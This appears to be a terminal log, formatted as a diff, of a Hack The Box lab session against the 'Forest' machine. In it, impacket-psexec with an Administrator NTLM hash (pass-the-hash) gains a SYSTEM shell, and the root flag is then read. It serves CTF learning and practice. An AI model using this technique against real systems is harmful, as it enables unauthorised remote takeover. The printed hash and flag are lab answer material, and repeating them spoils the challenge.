@@ -1,0 +1,38 @@
+user@kali:/mnt/windows/htb/boxes/forest$ ls -ltr ~/^C                                                                                       
+user@kali:/mnt/windows/htb/boxes/forest$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 HTB.LOCAL
+/Administrator@forest.htb.local   
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation             
+
+[*] Requesting shares on forest.htb.local.....                       
+[*] Found writable share ADMIN$   
+[*] Uploading file ITCRUCAB.exe   
+[*] Opening SVCManager on forest.htb.local.....                      
+[*] Creating service bLjQ on forest.htb.local.....                   
+[*] Starting service bLjQ.....    
+[!] Press help for extra shell commands                              
+Microsoft Windows [Version 10.0.14393]                               
+(c) 2016 Microsoft Corporation. All rights reserved.                 
+
+C:\Windows\system32>whoami        
+nt authority\system               
+
+C:\Windows\system32>ipconfig      
+
+Windows IP Configuration          
+
+
+Ethernet adapter Ethernet0:       
+
+   Connection-specific DNS Suffix  . :                               
+   IPv4 Address. . . . . . . . . . . : 10.10.10.161                  
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0                 
+   Default Gateway . . . . . . . . . : 10.10.10.2                    
+
+Tunnel adapter isatap.{E00B7E21-EE8E-4210-8C23-A108EFC92167}:        
+
+   Media State . . . . . . . . . . . : Media disconnected            
+   Connection-specific DNS Suffix  . :                               
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt     
+f048153f202bbb2f82622b04d79129cc  
+C:\Windows\system32>              
